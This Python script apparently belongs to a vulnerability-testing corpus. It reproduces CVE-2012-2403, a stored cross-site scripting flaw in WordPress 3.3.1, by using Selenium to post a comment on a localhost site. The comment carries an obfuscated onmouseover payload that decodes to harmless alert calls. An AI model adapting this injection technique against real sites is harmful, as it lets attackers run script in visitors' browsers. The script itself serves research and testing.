import sys
import time
import selenium.common.exceptions
import corpus

# POC: http://www.exploit-db.com/exploits/18791/

class Exploit (corpus.Exploit):

    def __init__(self):
        corpus.Exploit.__init__(self, {
                'Name' :        "CVE_2012_2403",
                'Description' : "Creates a post containing a XSS payload.",
                'References' :  [['CVE','2012-2403'],['http://www.osvdb.org/show/osvdb/81463']],
                'Target' :      "Wordpress 3.3.1",
                'Type' :        "XSS",
                'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/CVE-2012-2403"
                })
                                
        return
            
    def exploit(self):

        payload = "<a href=\"#\" title=\"XSS http://example.com/onmouseover=eval(unescape(/%61%6c%65%72%74%28%31%29%3b%61%6c%65%72%74%28%32%29%3b%61%6c%65%72%74%28%33%29%3b/.source))//\">XSS</a>"

        driver = self.create_selenium_driver()
        
        driver.get("http://localhost/wordpress/?p=1")
        print "Page opened successfully: ", driver.title
        print "uploading payload:", payload

        driver.find_element_by_id("author").clear()
        driver.find_element_by_id("author").send_keys("selenium script")
        driver.find_element_by_id("email").clear()
        driver.find_element_by_id("email").send_keys("selenium@python.org")
        driver.find_element_by_id("url").clear()
        driver.find_element_by_id("url").send_keys("www.python.org")
        driver.find_element_by_id("comment").clear()
        driver.find_element_by_id("comment").send_keys(payload)

        driver.find_element_by_id("submit").click()
        driver.cleanup()
        return


if __name__ == "__main__":
    engine = corpus.Engine(Exploit())
    engine.parse_args(sys.argv)
